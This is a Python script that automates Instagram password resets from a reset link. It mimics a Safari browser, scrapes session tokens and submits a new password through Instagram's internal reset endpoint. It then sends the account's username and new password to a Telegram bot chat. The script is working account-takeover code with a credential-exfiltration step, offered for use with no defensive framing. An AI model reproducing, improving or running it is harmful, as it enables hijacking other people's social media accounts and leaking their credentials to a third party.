import re
import json
import random
import requests
from urllib.parse import urlparse, parse_qs


UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/16.6.2 Safari/605.1.15"
)

BLOKS_VER = "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"


def generate_password(custom_password=None):
    if custom_password:
        return custom_password
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    return f'@hasu{nums}'


def make_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    })
    return s


def parse_reset_link(reset_link):
    parsed = urlparse(reset_link)
    qs = parse_qs(parsed.query)
    uidb36 = qs.get("uidb36", [None])[0]
    token_raw = qs.get("token", [None])[0]
    token = token_raw.split(":")[0] if token_raw else None
    return uidb36, token


def extract_fb_dtsg_from_html(html):
    """
    Instagram embeds fb_dtsg in script JSON blobs on every page.
    Try multiple known patterns.
    """
    patterns = [
        r'"fb_dtsg"\s*:\s*\{"token"\s*:\s*"([^"]+)"',
        r'"dtsg_ag"\s*:\s*\{"token"\s*:\s*"([^"]+)"',
        r'"token"\s*:\s*"(AQ[A-Za-z0-9_\-]{10,})"',
        r'"token"\s*:\s*"(Ad[A-Za-z0-9_\-]{10,})"',
        r'fb_dtsg["\s,:\[]+([A-Za-z0-9_\-]{20,})',
    ]
    for p in patterns:
        m = re.search(p, html)
        if m:
            return m.group(1)
    return None


def warmup(session):
    """
    Visit instagram.com to get csrftoken + mid cookies.
    Also try to grab fb_dtsg from the page HTML directly.
    """
    r = session.get(
        "https://www.instagram.com/",
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
        },
        timeout=15,
    )
    fb_dtsg = extract_fb_dtsg_from_html(r.text)
    return fb_dtsg


def get_confirmation_data(session, uidb36, token):
    """
    Call Instagram's confirmation_web endpoint which returns
    fb_dtsg, jazoest, error_state as JSON — the original intended API.
    Now called with a warmed-up session (has csrftoken + mid cookies).
    """
    csrftoken = session.cookies.get("csrftoken", "")
    url = (
        "https://www.instagram.com/api/v1/accounts/password/reset/confirmation_web/"
        f"?uidb36={uidb36}&token={token}"
    )
    r = session.get(
        url,
        headers={
            "Accept": "application/json, text/plain, */*",
            "Referer": (
                f"https://www.instagram.com/accounts/password/reset/confirm/"
                f"?uidb36={uidb36}&token={token}"
            ),
            "X-CSRFToken": csrftoken,
            "X-IG-App-ID": "936619743392459",
            "X-Instagram-AJAX": "1",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        },
        timeout=20,
    )
    if r.status_code != 200:
        return None, None, "", f"confirmation_web returned HTTP {r.status_code}: {r.text[:200]}"
    try:
        data = r.json()
        fb_dtsg  = data.get("fb_dtsg") or data.get("fbDtsg") or data.get("token")
        jazoest  = data.get("jazoest")
        error_state = data.get("error_state", "")
        return fb_dtsg, jazoest, error_state, None
    except Exception as e:
        return None, None, "", f"confirmation_web JSON parse error: {e} — {r.text[:200]}"


def load_reset_page_tokens(session, uidb36, token, existing_fb_dtsg):
    """
    Visit the HTML reset-confirm page to pick up jazoest / error_state,
    and try to extract fb_dtsg from the page HTML as a fallback.
    """
    r = session.get(
        f"https://www.instagram.com/accounts/password/reset/confirm/"
        f"?uidb36={uidb36}&token={token}",
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": "https://www.instagram.com/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
        },
        timeout=20,
    )
    html = r.text
    fb_dtsg = existing_fb_dtsg or extract_fb_dtsg_from_html(html)
    jazoest = None
    error_state = ""
    m = re.search(r'jazoest["\s:=]+([0-9]+)', html)
    if m:
        jazoest = m.group(1)
    m = re.search(r'"error_state"\s*:\s*"([^"]*)"', html)
    if m:
        error_state = m.group(1)
    return fb_dtsg, jazoest, error_state


def submit_password_reset(session, uidb36, token, fb_dtsg, jazoest, error_state, new_password):
    csrftoken = session.cookies.get("csrftoken", "")
    payload = {
        "uidb36": uidb36,
        "token": token,
        "new_password1": new_password,
        "new_password2": new_password,
        "fb_dtsg": fb_dtsg or "",
        "jazoest": jazoest or "",
        "error_state": error_state,
        "bk_client_context": json.dumps({
            "bloks_version": BLOKS_VER,
            "styles_id": "instagram",
        }),
        "bloks_versioning_id": BLOKS_VER,
    }
    r = session.post(
        "https://www.instagram.com/api/v1/bloks/apps/"
        "com.instagram.account_security.password_reset_submit_action_handler/",
        data=payload,
        headers={
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.instagram.com",
            "Referer": (
                f"https://www.instagram.com/accounts/password/reset/confirm/"
                f"?uidb36={uidb36}&token={token}"
            ),
            "X-CSRFToken": csrftoken,
            "X-IG-App-ID": "936619743392459",
            "X-Instagram-AJAX": "1",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        },
        timeout=30,
    )
    return r


def extract_username(text):
    m = re.search(r'"username"\s*[,:]\s*"([^"]+)"', text)
    return m.group(1) if m else None


def send_telegram(bot_token, chat_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": text},
            timeout=10,
        )
    except Exception:
        pass


def reset_instagram_password(reset_link, chat_id, bot_token, custom_password=None):
    try:
        uidb36, token = parse_reset_link(reset_link)
        if not uidb36 or not token:
            return {"success": False, "error": "Could not parse uidb36/token from reset link"}

        session = make_session()
        new_password = generate_password(custom_password)

        # Step 1: visit instagram.com — get cookies + try to grab fb_dtsg from page HTML
        fb_dtsg_from_home = warmup(session)

        # Step 2: call confirmation_web (the designed API for this) with warmed session
        fb_dtsg, jazoest, error_state, conf_err = get_confirmation_data(session, uidb36, token)

        # Step 3: visit the reset HTML page — fallback for fb_dtsg, and for jazoest/error_state
        fb_dtsg, jazoest, error_state = load_reset_page_tokens(
            session, uidb36, token,
            existing_fb_dtsg=fb_dtsg or fb_dtsg_from_home,
        )

        # Step 4: submit — even if fb_dtsg is empty, try anyway (csrftoken may suffice)
        r = submit_password_reset(
            session, uidb36, token, fb_dtsg, jazoest, error_state, new_password
        )

        username = extract_username(r.text)
        success = r.status_code == 200 and (
            "success" in r.text.lower()
            or "password" in r.text.lower()
            or username is not None
        )

        if not success:
            return {
                "success": False,
                "error": (
                    f"Reset failed (HTTP {r.status_code}): {r.text[:500]}"
                    + (f" | confirmation_web: {conf_err}" if conf_err else "")
                ),
            }

        display = f"@{username}" if username else f"uidb36:{uidb36}"
        send_telegram(
            bot_token, chat_id,
            f"\U0001d4d7\U0001d4f8\U0001d4f5\U0001d4ea! Password changed.\n\n"
            f"Username: {display}\nPassword: {new_password}",
        )
        return {"success": True, "username": username, "password": new_password}

    except requests.HTTPError as e:
        return {"success": False, "error": f"HTTP error: {e.response.status_code} {e.response.text[:300]}"}
    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {e}"}


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--reset-link", required=True)
    parser.add_argument("--chat-id", required=True)
    parser.add_argument("--bot-token", required=True)
    parser.add_argument("--custom-password", default=None)
    args = parser.parse_args()
    result = reset_instagram_password(
        args.reset_link, args.chat_id, args.bot_token, args.custom_password or None
    )
    print(json.dumps(result))
